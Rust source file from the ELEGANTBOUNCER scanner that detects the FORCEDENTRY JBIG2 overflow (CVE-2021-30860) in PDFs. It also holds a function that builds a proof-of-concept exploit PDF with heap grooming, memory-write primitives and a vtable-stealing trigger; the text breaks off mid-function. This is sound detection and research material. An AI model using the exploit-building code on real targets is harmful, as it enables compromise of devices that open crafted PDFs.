//
// Copyright (c) Matt Suiche. All rights reserved.
//
// Module Name:
//  jbig2.rs
//
// Abstract:
//  ELEGANTBOUNCER JBIG2/PDF scanner for FORCEDENTRY
//
// Author:
//  Matt Suiche (msuiche) 20-Nov-2022
//
use std::fmt;

use std::path;

use std::io::{Seek, SeekFrom, Read, Write, Cursor};
use lopdf::{Object, Stream, Document, dictionary};
use lopdf::content::{Content, Operation};
use byteorder::{ReadBytesExt, WriteBytesExt, BigEndian};

use colored::*;
use crate::errors::*;

use log::{info, debug, error};

/*
read the main stream..
*** variables ***
nRefSegs              = 0x20002
numSyms               = 0x2
readTextRegionSeg: syms                    @ 0x138727d50 with size 0x10
readTextRegionSeg: pageBitmap              = 0x138727ea0 (0x150 bytes after syms)
readTextRegionSeg: pageBitmap->data        = 0x1387279f0 (0x4b0 bytes before pageBitmap)
readTextRegionSeg: codeTables              = 0x138727ec0 (0x170 bytes away from syms)
readTextRegionSeg: segments                = 0x1499082a0 (0x111e0550 bytes away from syms)
readTextRegionSeg: segments->data          = 0x138727da0 (0x50 bytes away from syms)
readTextRegionSeg: globalSegments          = 0x149908280 (0x111e0530 bytes away from syms)
readTextRegionSeg: refSegs                 = 0x130018000
*** distance ***
segments->data    is 0x50 bytes after syms
pageBitmap        is 0x150 bytes after syms
pageBitmap->data  is 0xfffffffffffffca0 bytes after syms
pageBitmap        is 0x4b0 bytes after pageBitmap->data
data_buffer_to_bitmap:   0x4b0
data_buffer_to_segments: 0x3b0
(...)
readProfilesSeg (debug_sg)
pageBitmap: (readProfilesSeg)
0x138727ea0: 0x000000014990c780 (w = 0x7fffffff, h = 0x7fffffff)
0x138727ea8: 0x7fffffff4990c780 (w = 0x7fffffff, h = 0x7fffffff)
0x138727eb0: 0xffffffff7fffffff (w = 0x7fffffff, h = 0x7fffffff)
0x138727eb8: 0x00000001387279f0 (w = 0x7fffffff, h = 0x7fffffff)
0x138727ec0: 0x0000000149908420 (w = 0x7fffffff, h = 0x7fffffff)
0x138727ec8: 0x0000000000000000 (w = 0x7fffffff, h = 0x7fffffff)
*/


// const DATA_BUFFER_TO_SEGMENTS:          u32 = 0x3B0;
const DATA_BUFFER_TO_BITMAP:            u32 = 0x4b0;
// const DATA_BUFFER_TO_KNOWN_GOOD_BITMAP: u32 = 0x4d0;
const DATA_BUFFER_TO_BITMAP_W:          u32 = DATA_BUFFER_TO_BITMAP + 0x8 + 0x4;
const DATA_BUFFER_TO_BITMAP_H:          u32 = DATA_BUFFER_TO_BITMAP + 0x8 + 0x8;
const DATA_BUFFER_TO_BITMAP_LINE:       u32 = DATA_BUFFER_TO_BITMAP + 0x8 + 0xc;

const OR: u8 = 0;
// const AND: u8  = 1;
// const XOR: u8  = 2;
// const XNOR: u8  = 3;
// const REPLACE: u8  = 4;
// segment list operations in readGenericReginementSeg()
// const COMBINE: u8  = 0x2a;
// const STORE: u8  = 0x28;


#[derive(PartialEq)]
pub enum JBIG2SegmentType {
    SymbolDict                  = 0,
    TextRegion1                 = 4,
    TextRegion2                 = 5, // Imm
    TextRegion3                 = 6, // Lossless
    PatternDict                 = 16,
    HalftoneRegion1             = 20,
    HalftoneRegion2             = 22,
    HalftoneRegion3             = 23,
    GenericRegion1              = 36,
    GenericRegion2              = 38,
    GenericRegion3              = 39,
    GenericRefinementRegion1    = 40,
    GenericRefinementRegion2    = 42,
    GenericRefinementRegion3    = 43,
    PageInfo                    = 48,
    EndOfStrip                  = 50,
    EndOfFile                   = 51,
    Profiles                    = 52,
    CodeTables                  = 53,
    Extension                   = 62,
    Invalid                     = 0xff
}

/*
pub struct JBIG2SegInfo {
    pub seg_type:       JBIG2SegmentType,
    pub seg_num:        u32,
    pub seg_flags:      u32,
    pub ref_flags:      u32,
    pub seg_len:        u64,
}
*/

#[derive(Clone)]
pub struct JBIG2TextRegionSegment {
    pub seg_num:        u32,

    pub w:              u32,
    pub h:              u32,
    pub x:              u32,
    pub y:              u32,
    pub seg_info_flags: u8,
    pub flags:          u16,
    pub num_instances:  u32,
    pub decoder_bytes:  Option<Vec<u8>>,
}

impl JBIG2TextRegionSegment {
    fn new(
        seg_num:        Option<u32>,
        w:              u32,
        h:              u32,
        x:              u32,
        y:              u32,
        seg_info_flags: u8,
        flags:          u16,
        num_instances:  u32,
        decoder_bytes:  &[u8]
    ) -> Self {
        JBIG2TextRegionSegment {
            seg_num: seg_num.unwrap_or(0),
            w,
            h,
            x,
            y,
            seg_info_flags,
            flags,
            num_instances,
            decoder_bytes: Some(decoder_bytes.to_vec())
        }
    }

    fn get_data(&self) -> Result<Vec<u8>> {
        let mut buf = Vec::new();

        buf.write_u32::<BigEndian>(self.w)?;
        buf.write_u32::<BigEndian>(self.h)?;
        buf.write_u32::<BigEndian>(self.x)?;
        buf.write_u32::<BigEndian>(self.y)?;
        buf.write_u8(self.seg_info_flags)?;
        buf.write_u16::<BigEndian>(self.flags)?;
        buf.write_u32::<BigEndian>(self.num_instances)?;

        if let Some(data) = &self.decoder_bytes {
            buf.extend(data);
        }

        Ok(buf)
    }

}

#[derive(Clone)]
pub struct JBIG2PageInfoSegment {
    pub page_w:         u32,
    pub page_h:         u32,
    pub x_res:          u32,
    pub y_res:          u32,
    pub flags:          u8,
    pub striping:       u16
}

impl JBIG2PageInfoSegment {
    fn new(
        page_w:         u32,
        page_h:         u32,
        x_res:          u32,
        y_res:          u32,
        flags:          u8,
        striping:       u16      
    ) -> Self {
        JBIG2PageInfoSegment {
            page_w,
            page_h,
            x_res,
            y_res,
            flags,
            striping
        }
    }

    fn get_data(&self) -> Result<Vec<u8>> {
        let mut buf = Vec::new();

        buf.write_u32::<BigEndian>(self.page_w)?;
        buf.write_u32::<BigEndian>(self.page_h)?;
        buf.write_u32::<BigEndian>(self.x_res)?;
        buf.write_u32::<BigEndian>(self.y_res)?;
        buf.write_u8(self.flags)?;
        buf.write_u16::<BigEndian>(self.striping)?;

        Ok(buf)
    }
}

#[derive(Clone)]
pub struct JBIG2GenericRefinementRegionSegment {
    pub w:              u32,
    pub h:              u32,
    pub x:              u32,
    pub y:              u32,
    pub seg_info_flags: u8,
    pub flags:          u8,
    pub sd_atx:         [u8; 2],
    pub sd_aty:         [u8; 2],
    pub decoder_bytes:  Option<Vec<u8>>
}

impl JBIG2GenericRefinementRegionSegment {
    fn new(
        w:              u32,
        h:              u32,
        x:              u32,
        y:              u32,
        seg_info_flags: u8,
        flags:          u8,
        sd_atx:         [u8; 2],
        sd_aty:         [u8; 2],
        decoder_bytes:  &[u8]
    ) -> Self {
        JBIG2GenericRefinementRegionSegment {
            w,
            h,
            x,
            y,
            seg_info_flags,
            flags,
            sd_atx,
            sd_aty,
            decoder_bytes: Some(decoder_bytes.to_vec())
        }
    }

    fn get_data(&self) -> Result<Vec<u8>> {
        let mut buf = Vec::new();

        buf.write_u32::<BigEndian>(self.w)?;
        buf.write_u32::<BigEndian>(self.h)?;
        buf.write_u32::<BigEndian>(self.x)?;
        buf.write_u32::<BigEndian>(self.y)?;
        buf.write_u8(self.seg_info_flags)?;
        buf.write_u8(self.flags)?;
        if self.flags & 1 == 0 {
            buf.write_u8(self.sd_atx[0])?;
            buf.write_u8(self.sd_aty[0])?;
            buf.write_u8(self.sd_atx[1])?;
            buf.write_u8(self.sd_aty[1])?;
        }
        
        if let Some(data) = &self.decoder_bytes {
            buf.extend(data);
        }

        Ok(buf)
    }
}

#[derive(Clone)]
pub struct JBIG2SymbolDictionarySegment {
    // Extra Identifier
    pub seg_num:        u32,

    pub flags:          u16,
    pub sd_atx:         [u8; 4],
    pub sd_aty:         [u8; 4],
    pub num_ex_syms:    u64,
    pub num_new_syms:   u64,

    pub decoder_bytes:  Option<Vec<u8>>
}

impl JBIG2SymbolDictionarySegment {
    fn new(
        seg_num: Option<u32>,
        flags: u16,
        sd_atx: [u8; 4],
        sd_aty: [u8; 4],
        num_ex_syms: u64,
        num_new_syms: u64,
        decoder_bytes: &[u8]) -> Self {

        let snum = seg_num.unwrap_or(0xff);

        JBIG2SymbolDictionarySegment {
            seg_num: snum,
            flags,
            sd_atx,
            sd_aty,
            num_ex_syms,
            num_new_syms,
            decoder_bytes: Some(decoder_bytes.to_vec())
        }
    }

    fn get_num_ex_syms(&self) -> u64 {
        self.num_ex_syms
    }

    fn get_data(&self) -> Result<Vec<u8>> {
        let mut buf = Vec::new();

        buf.write_u16::<BigEndian>(self.flags)?;
        buf.write_u8(self.sd_atx[0])?;
        buf.write_u8(self.sd_aty[0])?;
        buf.write_u8(self.sd_atx[1])?;
        buf.write_u8(self.sd_aty[1])?;
        buf.write_u8(self.sd_atx[2])?;
        buf.write_u8(self.sd_aty[2])?;
        buf.write_u8(self.sd_atx[3])?;
        buf.write_u8(self.sd_aty[3])?;
        
        buf.write_u32::<BigEndian>(self.num_ex_syms as u32)?;
        buf.write_u32::<BigEndian>(self.num_new_syms as u32)?;
        if let Some(data) = &self.decoder_bytes {
            buf.extend(data);
        }

        Ok(buf)
    }

    /*
    fn get_seg_len(&self) -> usize {

    }*/
}

impl fmt::Display for JBIG2SegmentType {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {

        match self {
            JBIG2SegmentType::SymbolDict => write!(f, "SymbolDict"),
            JBIG2SegmentType::TextRegion1 => write!(f, "TextRegion1"),
            JBIG2SegmentType::TextRegion2 => write!(f, "TextRegion2"),
            JBIG2SegmentType::TextRegion3 => write!(f, "TextRegion3"),
            JBIG2SegmentType::PatternDict => write!(f, "PatternDict"),
            JBIG2SegmentType::HalftoneRegion1 => write!(f, "HalftoneRegion1"),
            JBIG2SegmentType::HalftoneRegion2 => write!(f, "HalftoneRegion2"),
            JBIG2SegmentType::HalftoneRegion3 => write!(f, "HalftoneRegion3"),
            JBIG2SegmentType::GenericRegion1 => write!(f, "GenericRegion1"),
            JBIG2SegmentType::GenericRegion2 => write!(f, "GenericRegion2"),
            JBIG2SegmentType::GenericRegion3 => write!(f, "GenericRegion3"),
            JBIG2SegmentType::GenericRefinementRegion1 => write!(f, "GenericRefinementRegion1"),
            JBIG2SegmentType::GenericRefinementRegion2 => write!(f, "GenericRefinementRegion2"),
            JBIG2SegmentType::GenericRefinementRegion3 => write!(f, "GenericRefinementRegion3"),
            JBIG2SegmentType::PageInfo => write!(f, "PageInfo"),
            JBIG2SegmentType::EndOfStrip => write!(f, "EndOfStrip"),
            JBIG2SegmentType::EndOfFile => write!(f, "EndOfFile"),
            JBIG2SegmentType::Profiles => write!(f, "Profiles"),
            JBIG2SegmentType::CodeTables => write!(f, "CodeTables"),
            JBIG2SegmentType::Extension => write!(f, "Extension"),
            _ =>  write!(f, "N/A")
        }
    }
}

#[derive(Clone)]
pub enum JBIG2SegmentData {
    Unassigned,
    JBIG2SymbolDictionarySegment(JBIG2SymbolDictionarySegment),
    JBIG2TextRegionSegment(JBIG2TextRegionSegment)
}

#[derive(Clone)]
pub struct JBIG2Segment {
    pub seg_num:        u32,
    pub seg_flags:      u32,
    pub ref_flags:      u32,

    pub is_large:       bool,
    pub ref_count:      usize,
    pub page:           u32,

    pub seg_size:       usize,
    pub ref_segs_len:   usize,

    pub seg_len:        usize,

    pub refs:           Option<Vec<u8>>,
    // pub num_ex_syms:    u64,

    pub data:           JBIG2SegmentData
}

impl JBIG2Segment { 
    fn new(
        seg_num: u32,
        seg_flags: u32,
        ref_flags: u32,
        page: u32,
        seg_len: usize) -> Self {

        JBIG2Segment {
            seg_num,
            seg_flags,
            ref_flags,
            is_large: false,
            ref_count: 0,
            ref_segs_len: 0,
            seg_size: 0,
            page,
            seg_len,
            refs: None,
            // num_ex_syms: 0,
            data: JBIG2SegmentData::Unassigned
        }
    }

    fn read<R: Read + Seek>(rdr: &mut R) -> Result<Self> {
        let seg_num = rdr.read_u32::<BigEndian>()?;
        let seg_flags = rdr.read_u8()? as u32;

        let mut ref_flags = rdr.read_u8()? as u32;
        let mut ref_count = 0;
        let is_large = (ref_flags >> 5) == 7;

        let mut ref_segs_len = 0;

        let mut res = JBIG2Segment::new(seg_num, seg_flags, ref_flags, 0, 0);

        let seg_size = match res.get_seg_num() {
            0..=255 => 1 as usize,
            256..=65536 => 2 as usize,
            _ => 4 as usize
        };

        let mut refs = Vec::new();

        if is_large {
            let c1 = rdr.read_u8()? as u32;
            let c2 = rdr.read_u8()? as u32;
            let c3 = rdr.read_u8()? as u32;
            ref_flags = (ref_flags << 24) | (c1 << 16) | (c2 << 8) | c3;
            ref_count = (ref_flags & 0x1fffffff) as usize;
            let ref_len = ref_count * seg_size;
            let pad_len = (ref_len + 9) >> 3;
            ref_segs_len = (ref_len + pad_len) as usize;

            rdr.seek(SeekFrom::Current(pad_len as i64))?;
            let mut v = vec![0u8; ref_len];
            rdr.read_exact(&mut v)?;
            refs = v.to_vec();

            res.data = JBIG2SegmentData::JBIG2TextRegionSegment(
                JBIG2TextRegionSegment::new(
                    Some(res.get_seg_num()),
                    0, 0, 0, 0, // w, h, x, y
                    0, // seg_info_flags
                    0, // flags
                    0, // num_instances
                    &[])
            );
        }

        // TODO: if seg_flags & 0x40 -> rdr.read_u32()
        // TODO: means that get_seg_hdr_len() needs += 3 also
        let page = rdr.read_u8()? as u32;
        let seg_len = rdr.read_u32::<BigEndian>()? as usize;
        res.page = page;
        res.seg_len = seg_len;
        
        // JBIG2SymbolDict
        // let mut num_ex_syms = 0;
        if res.get_type() == JBIG2SegmentType::SymbolDict {
            let flags = rdr.read_u16::<BigEndian>()? as u16;
            let atx = rdr.read_u32::<BigEndian>()?;
            let aty = rdr.read_u32::<BigEndian>()?;
            let num_ex_syms = rdr.read_u32::<BigEndian>()? as u64;
            let num_new_syms = rdr.read_u32::<BigEndian>()? as u64;

            res.data = JBIG2SegmentData::JBIG2SymbolDictionarySegment(
                JBIG2SymbolDictionarySegment::new(
                Some(res.get_seg_num()),
                flags,
                atx.to_be_bytes(),
                aty.to_be_bytes(),
                num_ex_syms,
                num_new_syms,
                &[])
            );
        } 

        // self.seg_num = seg_num;
        // self.seg_flags = seg_flags;
        // self.ref_flags = ref_flags;
        res.is_large = is_large;
        res.ref_count = ref_count;
        res.ref_segs_len = ref_segs_len;
        res.seg_size = seg_size;
        res.page = page;
        // v.seg_len = seg_len;
        res.refs = Some(refs);
        // self.num_ex_syms = num_ex_syms;

        Ok(res)
    }

    pub fn get_type(&self) -> JBIG2SegmentType {
        match self.seg_flags & 0x3f {
            0 => JBIG2SegmentType::SymbolDict,
            4 => JBIG2SegmentType::TextRegion1,
            5 => JBIG2SegmentType::TextRegion2,
            6 => JBIG2SegmentType::TextRegion3,
            16 => JBIG2SegmentType::PatternDict,
            20 => JBIG2SegmentType::HalftoneRegion1,
            22 => JBIG2SegmentType::HalftoneRegion2,
            23 => JBIG2SegmentType::HalftoneRegion3,
            36 => JBIG2SegmentType::GenericRegion1,
            38 => JBIG2SegmentType::GenericRegion2,
            39 => JBIG2SegmentType::GenericRegion3,
            40 => JBIG2SegmentType::GenericRefinementRegion1,
            42 => JBIG2SegmentType::GenericRefinementRegion2,
            43 => JBIG2SegmentType::GenericRefinementRegion3,
            48 => JBIG2SegmentType::PageInfo,
            50 => JBIG2SegmentType::EndOfStrip,
            51 => JBIG2SegmentType::EndOfFile,
            52 => JBIG2SegmentType::Profiles,
            53 => JBIG2SegmentType::CodeTables,
            62 => JBIG2SegmentType::Extension,
            _ => JBIG2SegmentType::Invalid
        }
    }

    fn get_seg_num(&self) -> u32 {
        self.seg_num
    }

    fn is_large(&self) -> bool {
        self.is_large
    }

    fn get_ref_len(&self) -> usize {
        if self.is_large() {
            self.ref_segs_len
        } else {
            0
        }
    }

    fn get_seg_len(&self) -> usize {
        self.get_seg_hdr_len() + self.get_ref_len() + self.seg_len
    }

    fn get_seg_hdr_len(&self) -> usize {
        if self.is_large() {
            4 + 1 + 4 + 1 + 4
        } else {
            4 + 4 + 3
        }
    }

    fn get_refs(&self) -> Result<Vec<u8>> {
        let mut buf = Vec::new();

        if let Some(refs) = &self.refs {
            buf.extend(refs);
        }
        Ok(buf)
    }

    fn set_refs(&mut self, refs: Vec<u8>) {
        self.refs = Some(refs.clone());
        self.is_large = true;
    }

    fn get_num_ex_syms(&self) -> u64 {
        let v = match &self.data {
            JBIG2SegmentData::JBIG2SymbolDictionarySegment(sds) => {
                sds.get_num_ex_syms()
            },
            _ => 0
        };

        v
    }

    fn get_data(&self) -> Result<Vec<u8>> {
        let mut buf = Vec::new();

        if self.is_large() == false {
            buf.write_u32::<BigEndian>(self.seg_num)?;
            buf.write_u8(self.seg_flags as u8)?;
            buf.write_u8(self.ref_flags as u8)?;
            buf.write_u8(self.page as u8)?;
            buf.write_u32::<BigEndian>(self.seg_len as u32)?;
        } else {
            buf.write_u32::<BigEndian>(self.seg_num)?;
            buf.write_u8(self.seg_flags as u8)?;
            buf.write_u32::<BigEndian>(self.ref_flags)?;
            if let Some(refs) = &self.refs {
                buf.extend(refs);
            }
            buf.write_u8(self.page as u8)?;
            buf.write_u32::<BigEndian>(self.seg_len as u32)?;
        }

        Ok(buf)
    }
}

pub struct JBIG2Stream {
    pub segs:       Vec<JBIG2Segment>,
    pub syms:       Vec<JBIG2Segment>,
    pub regions:    Vec<JBIG2Segment>
}

impl JBIG2Stream {
    fn new() -> Self {
        JBIG2Stream {
            segs: Vec::new(),
            syms: Vec::new(),
            regions: Vec::new()
        }
    }

    pub fn get_syms_len(&self) -> usize {
        self.syms.len()
    }

    pub fn get_len_by_seg_num(&self, seg_num: u32) -> u64 {
        /*
        let syms = self.segs
        .iter()
        .filter(|seg_hdr| seg_hdr.get_type() == JBIG2SegmentType::SymbolDict);
        */
        
        for sym in &self.syms {
            if seg_num == sym.get_seg_num() {
                return sym.get_num_ex_syms();
            }
        }

        0
    }

    fn parse_jbig2_stream(&mut self, in_buf: &[u8]) -> Result<()> {
        let mut rdr = Cursor::new(in_buf);

        loop {
            if let Ok(seg_hdr) = JBIG2Segment::read(&mut rdr.clone()) {
                self.segs.push(seg_hdr.clone());

                if seg_hdr.get_seg_len() == 0 && seg_hdr.get_seg_num() == 0 {
                    break;
                }

                rdr.seek(SeekFrom::Current(seg_hdr.get_seg_len() as i64))?;
            } else {
                break;
            }
        }

        // This is too slow to filter every time we call get_len_by_seg_num(), so we need to cache it.
        let syms = self.segs.iter().filter(|seg_hdr| seg_hdr.get_type() == JBIG2SegmentType::SymbolDict);
        for sym in syms {
            self.syms.push(sym.clone());
        }

        let regions = self.segs.iter().filter(|seg_hdr| seg_hdr.get_type() == JBIG2SegmentType::TextRegion1);
        for region in regions {
            self.regions.push(region.clone());
        }

        Ok(())
    }

    #[allow(dead_code)]
    fn display_data(&self) {
        // debug!("number of segments: 0x{:x}", segs.len());
        info!("number of symbols: 0x{:x}", self.get_syms_len());
        info!("number of regions: 0x{:x}", self.regions.len());

        self.segs
        .iter()
        .filter(|seg_hdr| seg_hdr.get_type() == JBIG2SegmentType::SymbolDict)
        .for_each(|sym| {
            info!("seg_num: 0x{:x} size: 0x{:x}", sym.get_seg_num(), sym.get_num_ex_syms());
        });

    }

    fn is_forcedentry(&self) -> bool {
        for region in &self.regions {
            let mut num_syms = 0;
            if let Ok(refs) = region.get_refs() {
                for ref_seg_num in refs {
                    let sz = self.get_len_by_seg_num(ref_seg_num as u32);
                    num_syms += sz;
                    // debug!("0x{:x} -> {:x} (0x{:x})", ref_seg_num, sz, num_syms);
                }
            }
            if num_syms > std::u32::MAX as u64 {
                return true;
            }
        }

        false
    }
}

pub fn scan_pdf_jbig2_file(path: &path::Path) -> Result<ScanResultStatus> {
    info!("Opening {}...", path.display());
    let doc = Document::load(path)?;

    let mut jbig2_stream = JBIG2Stream::new();
    let mut ref_globals = None;

    // Get JBIG2Globals
    for object in doc.objects.values() {
        if let Object::Stream(ref s) = *object {
            let params = s.dict.get(b"DecodeParms").and_then(Object::as_dict).ok();
    
            ref_globals = params
                .and_then(|p| p.get(b"JBIG2Globals").ok())
                .and_then(|p| Object::as_reference(p).ok());

            if ref_globals.is_some() {
                debug!("JBIG2Globals Ref: {:?}", ref_globals);
                break;
            }
        }
    }

    if let Some(_gid) = ref_globals {
        debug!("Checking for JBIG2 presence...          {}", "Present.".white());
    } else {
        debug!("Checking for JBIG2 presence...          {}", "Not Present.".white());
    }


    // Get JBIG2Globals
    if let Some(global_id) =  ref_globals {
        if let Ok(obj) = doc.get_object(global_id) {
            if let Ok(s) = obj.as_stream() {
                let in_buf = s.content.as_slice();
                if let Err(_e) = jbig2_stream.parse_jbig2_stream(in_buf) {
                    error!("jbig2_stream.parse_jbig2_stream() failed.");
                }
            }
        }

        // Find the JBIG2Decode Object
        doc.objects
        .into_iter()
        // .filter(|(_, object)| object.type_name().ok() == Some("XObject"))
        .for_each(|(_obj_id, obj)| {
            if let Ok(s) = obj.as_stream() {
                if s.dict.get(b"Subtype").and_then(Object::as_name_str).ok() == Some("Image") {
                    if let Ok(filters) = s.filters() {
                        for filter in filters {
                            match filter.as_str() {
                                "JBIG2Decode" => {
                                    let in_buf = s.content.as_slice();
                                    if let Err(_e) = jbig2_stream.parse_jbig2_stream(in_buf) {
                                        error!("jbig2_stream.parse_jbig2_stream() failed.");
                                    }
                                },
                                _ => {
                                    panic!()
                                }
                            }
                        }
                    }
                }
            }
        });
    }

    // jbig2_stream.display_data();

    // Sanity check
    let cve_2021_30860 = jbig2_stream.is_forcedentry();

    if cve_2021_30860 { 
        // info!("CVE-2021-30860 vulnerability trigger... {}", "Present.".red());
        return Ok(ScanResultStatus::StatusMalicious);
    } else {
        // info!("CVE-2021-30860 vulnerability trigger... {}", "Safe.".green());
    }

    Ok(ScanResultStatus::StatusOk)
}


fn or_808080h_at_offset_h<W: Write>(out: &mut W, offset: u32) -> Result<()> {
    // encode_bit(&ctx, ctx.context, 0, 1);
    let data_bytes = [0xff, 0x7f, 0xff, 0xac];

	for idx in 0..3 {
        let grrs = JBIG2GenericRefinementRegionSegment::new(
            0x1,
            0x1,
            0, 
            offset + idx,
            OR,
            0,
            [0,0], 
            [0,0], 
            &data_bytes);
        let data = grrs.get_data()?;
        let grrs_sh = JBIG2Segment::new(0xffffffff, 0x2a, 0, 1, data.len());
        out.write_all(&grrs_sh.get_data()?)?;
        out.write_all(&data)?;
    }

    Ok(())
}

fn write_dbg_header<W: Write>(out: &mut W) -> Result<()> {
    let dbg_sh = JBIG2Segment::new(0xffffffff, 0x34, 0, 1, 0);
    out.write_all(&dbg_sh.get_data()?)?;

    Ok(())
}

fn or_bytes_at_offset_w<W: Write>(out: &mut W, mask: u32, offset: u32) -> Result<()> {
    // encode_bit(&ctx, ctx.context, 0, 1);
    let or_one = [0xff, 0x7f, 0xff, 0xac];
    // encode_bit(&ctx, ctx.context, 0, 0);
    let or_zero = [0x7f, 0xff, 0xac];

    let bitshift = u32::to_be(mask);

	for bit in 0..32 {
        let mut decoder_bytes: &[u8] = &or_one;
        let encode_bit = (bitshift >> (31 - bit)) & 1;
        if encode_bit == 0 {
            decoder_bytes =  &or_zero;
        }

        let grrs = JBIG2GenericRefinementRegionSegment::new(
            0x1,
            0x1,
            (offset << 3) + bit,
            0,
            OR,
            0,
            [0,0], 
            [0,0], 
            decoder_bytes);
        let data = grrs.get_data()?;
        let grrs_sh = JBIG2Segment::new(0xffffffff, 0x2a, 0, 1, data.len());
        out.write_all(&grrs_sh.get_data()?)?;
        out.write_all(&data)?;
    }

    Ok(())
}

fn create_pdf(path: &path::Path, global_stream: &Vec<u8>, main_stream: &Vec<u8>) -> Result<()> {
    let mut doc = Document::with_version("1.5");
    // doc.reference_table.cross_reference_type = xref::XrefType::CrossReferenceTable;

    let catalog_id = doc.new_object_id();
    let outlines = doc.add_object(dictionary! {"Type" => "Outlines", "Count" => "0"});
    let pages_id = doc.new_object_id();

    let symd = doc.add_object(Stream::new(dictionary! {}, global_stream.to_vec()));
    let img_name = "Im1";

    let xobj = doc.add_object(Stream::new(dictionary! {
        "DecodeParms" => dictionary!{ 
            "JBIG2Globals" => symd
        },
        "Width" => Object::Integer(1),
        "ColorSpace" => "DeviceGray",
        "Height" => Object::Integer(1),
        "Filter" => "JBIG2Decode",
        "Subtype" => "Image",
        "Type" => "XObject",
        "BitsPerComponent" => Object::Integer(1),
    }, main_stream.to_vec()));

    let contents = doc.add_object(Stream::new(dictionary! {}, 
        Content {
            operations: vec![
                Operation::new("q", vec![]),
                Operation::new(
                    "cm",
                    vec![Object::Real(1f32), 0.into(), 0.into(), Object::Real(1f32), 0.into(), 0.into()],
                ),
                Operation::new("Do", vec![img_name.clone().into()]),
                Operation::new("Q", vec![]),
            ]
        }.encode().unwrap()));

    let resources = doc.add_object(dictionary! {
        "XObject" => dictionary!{ 
            img_name => xobj
        },
        "ProcSet" => Object::Array(vec![Object::Name(b"PDF".to_vec()), Object::Name(b"ImageB".to_vec())]),
    });
    
    let page_id = doc.add_object(dictionary! {
        "Type" => "Page",
        "Parent" => pages_id,
        "Contents" => contents,
        "Resources" => resources,
        "MediaBox" => Object::Array(vec![0.into(), 0.into(), Object::Real(1.0), Object::Real(1.0)]),
    });

    let pages = dictionary! {
        "Type" => "Pages",
        "Kids" => vec![page_id.into()],
        "Count" => 1,
    };

    let catalog = dictionary! {
        "Type" => "Catalog", "Outlines" => outlines, "Pages" => pages_id
    };

    doc.objects.insert(pages_id, Object::Dictionary(pages));
    doc.objects.insert(catalog_id, Object::Dictionary(catalog));

    doc.trailer.set("Root", catalog_id);

    doc.save(path).unwrap();

    Ok(())
}

pub fn create(path: &path::Path) -> Result<()> {
    info!("Creating {}..", path.display());

    // Global
    let sds = JBIG2SymbolDictionarySegment::new(
        None,
        0, // flags
        [0x03,0xFD,0x02,0xFE],
        [0xFF,0xFF,0xFE,0xFE],
        1,
        1,
        &[0x93, 0xFC, 0x7F, 0xFF, 0xAC]);
    let sds_bytes = sds.get_data()?;
    let sds_sh = JBIG2Segment::new(0xff, 0, 1, 0, sds_bytes.len());

    // let mut global_stream = File::create("poc.sym")?;
    let mut global_stream = Vec::new();
    global_stream.write_all(&sds_sh.get_data()?)?;
    global_stream.write_all(&sds_bytes)?;

    // Part 2
    // let mut main_stream = File::create("poc.0000")?;
    let mut main_stream = Vec::new();

    let pis = JBIG2PageInfoSegment::new(1, 1, 0, 0, 0, 0);
    let data = pis.get_data()?;
    let sds_sh = JBIG2Segment::new(0xffffffff, 0x30, 0, 1, data.len());
    main_stream.write_all(&sds_sh.get_data()?)?;
    main_stream.write_all(&data)?;

    let sds = JBIG2SymbolDictionarySegment::new(
        None,
		0, 
		[0x03,0xFD,0x02,0xFE], 
		[0xFF,0xFF,0xFE,0xFE], 
		0xFFFF, 
		0xFFFF,
		&[0x94,0x4f,0x06,0x7b,0xff,0x7f,0xff,0x7f,0xff,0x7f,0xff,0x7d,0xd3,0x26,0xa8,0x9d,0x6c,0xb0,0xee,0x7f,0xff,0xac]
    );
    let data = sds.get_data()?;
    let sds_sh = JBIG2Segment::new(1, 0, 1, 0, data.len());
    main_stream.write_all(&sds_sh.get_data()?)?;
    main_stream.write_all(&data)?;

	// force 1Q mallocs to eat up all the free space
	for _i in 1..0x10000 {
        let pis = JBIG2PageInfoSegment::new(0x71, 1, 0, 0, 0, 0);
        let data = pis.get_data()?;
        let sds_sh = JBIG2Segment::new(0xffffffff, 0x30, 0, 1, data.len());
        main_stream.write_all(&sds_sh.get_data()?)?;
        main_stream.write_all(&data)?;
    }

    
    // set up segments Glist for resizing (reallocation)
	for _i in 0..0xf {
        let sds = JBIG2SymbolDictionarySegment::new(
            None,
            0,
            [0x03,0xFD,0x02,0xFE],
            [0xFF,0xFF,0xFE,0xFE],
            1,
            1, 
            &[0x93,0xFC,0x7F,0xFF,0xAC]
        );
        let data = sds.get_data()?;
        let sds_sh = JBIG2Segment::new(2, 0, 1, 0, data.len());
        main_stream.write_all(&sds_sh.get_data()?)?;
        main_stream.write_all(&data)?;
    }

    // allocate 0x80, 0x80, and 0x40 in that order
    // flags = 0 which means (flags & 1) = 0 (huffman flag)
    // so this triggers arithDecoder->decodeInt(&dh, iadhStats);
	// inside readSymbolDictSeg()
    let sds = JBIG2SymbolDictionarySegment::new(
        None,
		0,
		[0x03,0xFD,0x02,0xFE], 
		[0xFF,0xFF,0xFE,0xFE], 
		3, 
		3, // getSize()
        &[0x13,0xb0,0xb7,0xcf,0x36,0xb1,0x68,0xbf,0xff,0xac] // Original Decoder Bytes
    );
    let data = sds.get_data()?;
    let sds_sh = JBIG2Segment::new(3, 0, 1, 0, data.len());
    main_stream.write_all(&sds_sh.get_data()?)?;
    main_stream.write_all(&data)?;

    // consume some freed blocks
    let pis = JBIG2PageInfoSegment::new(0x71, 1, 0, 0, 0, 0);
    let data = pis.get_data()?;
    let sds_sh = JBIG2Segment::new(0xffffffff, 0x30, 0, 1, data.len());
    main_stream.write_all(&sds_sh.get_data()?)?;
    main_stream.write_all(&data)?;

	// allocate page that will be exploited
	// 0x3F1 results in a malloc of 0x80 for the buffer, should reclaim from cache
    let pis = JBIG2PageInfoSegment::new(0x3F1, 1, 0, 0, 0, 0);
    let data = pis.get_data()?;
    let sds_sh = JBIG2Segment::new(4, 0x30, 0, 1, data.len());
    main_stream.write_all(&sds_sh.get_data()?)?;
    main_stream.write_all(&data)?;

    // trigger the vuln and create a bitmap directly after triggering, will steal vtable for arbitrary read
    let trs = JBIG2TextRegionSegment::new(None, 1, 1, 0, 0, 0, 0, 1, &[0xA9,0x43,0xFF,0xAC]);
    let mut ref_seg_bytes = Vec::new();
    ref_seg_bytes.extend_from_slice(&[0xffu8; 0x2d]);
    ref_seg_bytes.extend_from_slice(&[0x02u8; 0xffd2]);
    ref_seg_bytes.extend_from_slice(&[0x01u8; 0x10000]);
    ref_seg_bytes.extend_from_slice(&[0x02u8; 3]);
